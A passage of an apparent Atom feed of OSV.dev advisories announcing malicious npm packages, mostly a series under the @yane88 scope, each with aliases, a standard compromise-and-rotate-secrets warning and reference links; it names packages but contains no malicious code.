+    <updated>2026-09-01T03:45:14Z</updated>
+    <category term="npm"/>
+    <category term="GHSA-jhgv-vh9h-q3r9"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in matrix-by-lmx (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-jhgv-vh9h-q3r9&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;matrix-by-lmx&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: ghsa-malware (e7231cfc70a9c0bfad0c50204a6524688f4cdc2bb17c14de1db6554e42c177ac)
+Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
+&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-jhgv-vh9h-q3r9"&gt;https://github.com/advisories/GHSA-jhgv-vh9h-q3r9&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-15670"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-15668: Malicious code in core_main (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-15668</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-15668"/>
+    <published>2026-09-01T01:03:21Z</published>
+    <updated>2026-09-01T03:45:14Z</updated>
+    <category term="npm"/>
+    <category term="GHSA-rxjr-qr5x-q4q7"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in core_main (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-rxjr-qr5x-q4q7&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;core_main&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: ghsa-malware (714d7b7f27d891d1e7f811b4dd9e4361b96a2943b00149ad8db153ad501a0ee7)
+Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
+&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-rxjr-qr5x-q4q7"&gt;https://github.com/advisories/GHSA-rxjr-qr5x-q4q7&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-15668"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-15652: Malicious code in @yane88/idea-2026.2-02 (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-15652</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-15652"/>
+    <published>2026-09-01T02:29:06Z</published>
+    <updated>2026-09-01T03:45:14Z</updated>
+    <category term="npm"/>
+    <category term="GHSA-fgwh-qm8c-9mv8"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in @yane88/idea-2026.2-02 (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-fgwh-qm8c-9mv8&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@yane88/idea-2026.2-02&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: ghsa-malware (e0aadacf7ad71847f33584da544505cb73d5d08b0ae8b167843198507252343a)
+Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
+&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-fgwh-qm8c-9mv8"&gt;https://github.com/advisories/GHSA-fgwh-qm8c-9mv8&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-15652"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-15649: Malicious code in @yane88/hexhub-client (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-15649</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-15649"/>
+    <published>2026-09-01T02:29:07Z</published>
+    <updated>2026-09-01T03:45:14Z</updated>
+    <category term="npm"/>
+    <category term="GHSA-75h3-gh74-47p2"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in @yane88/hexhub-client (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-75h3-gh74-47p2&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@yane88/hexhub-client&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: ghsa-malware (a628c35399f2993b111f79396b198c542374b19367ccb6062c5f59f2b61dfdbf)
+Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
+&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-75h3-gh74-47p2"&gt;https://github.com/advisories/GHSA-75h3-gh74-47p2&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-15649"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-15661: Malicious code in @yane88/term-reqable (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-15661</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-15661"/>
+    <published>2026-09-01T02:29:07Z</published>
+    <updated>2026-09-01T03:45:14Z</updated>
+    <category term="npm"/>
+    <category term="GHSA-xx48-j637-66x2"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in @yane88/term-reqable (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-xx48-j637-66x2&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@yane88/term-reqable&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: ghsa-malware (bede455ffb8df248983dc819abe214260d4d70582e54f60c9cf99e974f3bafa9)
+Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
+&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-xx48-j637-66x2"&gt;https://github.com/advisories/GHSA-xx48-j637-66x2&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-15661"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-15656: Malicious code in @yane88/idea-2026.2-06 (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-15656</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-15656"/>
+    <published>2026-09-01T02:29:06Z</published>
+    <updated>2026-09-01T03:45:14Z</updated>
+    <category term="npm"/>
+    <category term="GHSA-j62v-qq84-cr9v"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in @yane88/idea-2026.2-06 (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-j62v-qq84-cr9v&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@yane88/idea-2026.2-06&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: ghsa-malware (d8e74f391d9dc01128c64b548253e9e712be03e37e477268ab1a122f27e007e8)
+Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
+&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-j62v-qq84-cr9v"&gt;https://github.com/advisories/GHSA-j62v-qq84-cr9v&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-15656"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-15669: Malicious code in kendo-angular-window (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-15669</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-15669"/>
+    <published>2026-09-01T01:03:21Z</published>
+    <updated>2026-09-01T03:45:14Z</updated>
+    <category term="npm"/>
+    <category term="GHSA-jjx4-p3qc-rhrq"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in kendo-angular-window (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-jjx4-p3qc-rhrq&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;kendo-angular-window&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: ghsa-malware (7afbba3466805ffeef8538ad094c6670a5506c0a6c3f7c47b735ebd487c4dda6)
+Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
+&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-jjx4-p3qc-rhrq"&gt;https://github.com/advisories/GHSA-jjx4-p3qc-rhrq&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-15669"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-15655: Malicious code in @yane88/idea-2026.2-05 (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-15655</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-15655"/>
+    <published>2026-09-01T02:29:06Z</published>
+    <updated>2026-09-01T03:45:14Z</updated>
+    <category term="npm"/>
+    <category term="GHSA-mv54-8cx5-2fc9"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in @yane88/idea-2026.2-05 (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-mv54-8cx5-2fc9&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@yane88/idea-2026.2-05&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: ghsa-malware (5865c413c00416de3502791f9af838084ce486d92080591868a79bab3e346aa8)
+Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
+&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-mv54-8cx5-2fc9"&gt;https://github.com/advisories/GHSA-mv54-8cx5-2fc9&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-15655"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-15658: Malicious code in @yane88/listary-01 (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-15658</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-15658"/>
+    <published>2026-09-01T02:29:07Z</published>
+    <updated>2026-09-01T03:45:14Z</updated>
+    <category term="npm"/>
+    <category term="GHSA-46j3-wfp2-66m2"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in @yane88/listary-01 (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-46j3-wfp2-66m2&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@yane88/listary-01&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: ghsa-malware (c251febb1cf24e0bba70c2b46d07f5234302869fe4d976788a4a6fc649f6df84)
+Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
+&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-46j3-wfp2-66m2"&gt;https://github.com/advisories/GHSA-46j3-wfp2-66m2&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-15658"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[UPDATED] MAL-2025-6396: Malicious code in acme-diagnostics (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2025-6396</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2025-6396"/>
+    <published>2025-06-27T15:25:30Z</published>
+    <updated>2026-09-01T03:45:13Z</updated>
+    <category term="npm"/>
+    <category term="GHSA-hrpj-x9hr-gg9j"/>
+    <category term="SNYK-JS-ACMEDIAGNOSTICS-10558303"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in acme-diagnostics (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-hrpj-x9hr-gg9j, SNYK-JS-ACMEDIAGNOSTICS-10558303&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;acme-diagnostics&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: ghsa-malware (0426cc39b2ae6284445426cedc83e1a6fe02273c6a3a1eaf6d6b6d15a73ba054)
+Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
+&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-hrpj-x9hr-gg9j"&gt;https://github.com/advisories/GHSA-hrpj-x9hr-gg9j&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://security.snyk.io/vuln/SNYK-JS-ACMEDIAGNOSTICS-10558303"&gt;https://security.snyk.io/vuln/SNYK-JS-ACMEDIAGNOSTICS-10558303&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://npmjs.com/package/acme-diagnostics"&gt;https://npmjs.com/package/acme-diagnostics&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://npmjs.com/package/acme-diagnostics"&gt;https://npmjs.com/package/acme-diagnostics&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://security.snyk.io/vuln/SNYK-JS-ACMEDIAGNOSTICS-10558303"&gt;https://security.snyk.io/vuln/SNYK-JS-ACMEDIAGNOSTICS-10558303&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2025-6396"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-15657: Malicious code in @yane88/listary (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-15657</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-15657"/>
+    <published>2026-09-01T02:29:07Z</published>
+    <updated>2026-09-01T03:45:13Z</updated>
+    <category term="npm"/>
+    <category term="GHSA-6qjf-3c98-5gr7"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in @yane88/listary (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-6qjf-3c98-5gr7&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@yane88/listary&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: ghsa-malware (75eebc462159ce103e7f7cd5683c2a6530b738f84ee757d3cc92bd79583b35ed)
+Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
+&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-6qjf-3c98-5gr7"&gt;https://github.com/advisories/GHSA-6qjf-3c98-5gr7&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-15657"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-15659: Malicious code in @yane88/listary-02 (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-15659</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-15659"/>
+    <published>2026-09-01T02:29:07Z</published>
+    <updated>2026-09-01T03:45:13Z</updated>
+    <category term="npm"/>
+    <category term="GHSA-rg2v-g672-8773"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in @yane88/listary-02 (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-rg2v-g672-8773&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@yane88/listary-02&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: ghsa-malware (4006f23330743fab692429ac784aa3d6fc4413a2a41962b6ec66a49d3ceafaf6)
+Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
+&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-rg2v-g672-8773"&gt;https://github.com/advisories/GHSA-rg2v-g672-8773&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-15659"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-15663: Malicious code in @yane88/term-reqable-02 (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-15663</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-15663"/>
+    <published>2026-09-01T02:29:07Z</published>
+    <updated>2026-09-01T03:45:13Z</updated>
+    <category term="npm"/>
+    <category term="GHSA-vq2v-vw6h-9g9f"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in @yane88/term-reqable-02 (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-vq2v-vw6h-9g9f&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@yane88/term-reqable-02&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: ghsa-malware (3c0e2129fbf1e7a2da4c71b24bbd38abade289a0f9aa576bacefb53566046cc8)
+Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
+&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-vq2v-vw6h-9g9f"&gt;https://github.com/advisories/GHSA-vq2v-vw6h-9g9f&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-15663"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-15666: Malicious code in @yane88/workbuddy-02 (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-15666</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-15666"/>
+    <published>2026-09-01T02:29:07Z</published>
+    <updated>2026-09-01T03:45:13Z</updated>
+    <category term="npm"/>
+    <category term="GHSA-677c-x838-7qj5"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in @yane88/workbuddy-02 (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-677c-x838-7qj5&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@yane88/workbuddy-02&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: ghsa-malware (5f0760e3b931f8bb1f56af0e82247b69496493e656eda5c593b041e3d994eacf)
+Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
+&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-677c-x838-7qj5"&gt;https://github.com/advisories/GHSA-677c-x838-7qj5&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-15666"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-15667: Malicious code in @yane88/workbuddy-03 (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-15667</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-15667"/>
+    <published>2026-09-01T02:29:07Z</published>
+    <updated>2026-09-01T03:45:13Z</updated>
+    <category term="npm"/>
+    <category term="GHSA-qpjf-29xc-g688"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in @yane88/workbuddy-03 (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-qpjf-29xc-g688&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@yane88/workbuddy-03&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: ghsa-malware (d30bc9ba776b79394d7faae036b7d07b7a217d368815826c6c36f8e58017d182)
+Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
+&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-qpjf-29xc-g688"&gt;https://github.com/advisories/GHSA-qpjf-29xc-g688&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-15667"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-15650: Malicious code in @yane88/idea-2026.2 (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-15650</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-15650"/>
+    <published>2026-09-01T02:29:06Z</published>
+    <updated>2026-09-01T03:45:13Z</updated>
+    <category term="npm"/>
+    <category term="GHSA-5qw7-3hqh-q33m"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in @yane88/idea-2026.2 (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-5qw7-3hqh-q33m&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@yane88/idea-2026.2&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: ghsa-malware (9a9e6ff544a605ec409572efcacfaab5988c6314c01cb3e8f18b5c1f29613224)
+Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
+&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-5qw7-3hqh-q33m"&gt;https://github.com/advisories/GHSA-5qw7-3hqh-q33m&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-15650"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-15665: Malicious code in @yane88/workbuddy-01 (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-15665</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-15665"/>
+    <published>2026-09-01T02:29:07Z</published>
+    <updated>2026-09-01T03:45:13Z</updated>
+    <category term="npm"/>
+    <category term="GHSA-2w3r-v82c-4rvg"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in @yane88/workbuddy-01 (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: GHSA-2w3r-v82c-4rvg&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@yane88/workbuddy-01&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: ghsa-malware (8bec270d0d10cc3755164a1bee61e7215a1a92c2c26e504876ae748f40cb46de)
+Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
+&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/advisories/GHSA-2w3r-v82c-4rvg"&gt;https://github.com/advisories/GHSA-2w3r-v82c-4rvg&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-15665"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-15651: Malicious code in @yane88/idea-2026.2-01 (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-15651</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-15651"/>
+    <published>2026-09-01T02:29:06Z</published>
+    <updated>2026-09-01T03:45:13Z</updated>
+    <category term="npm"/>
+    <category term="GHSA-2fmg-86jf-r56c"/>
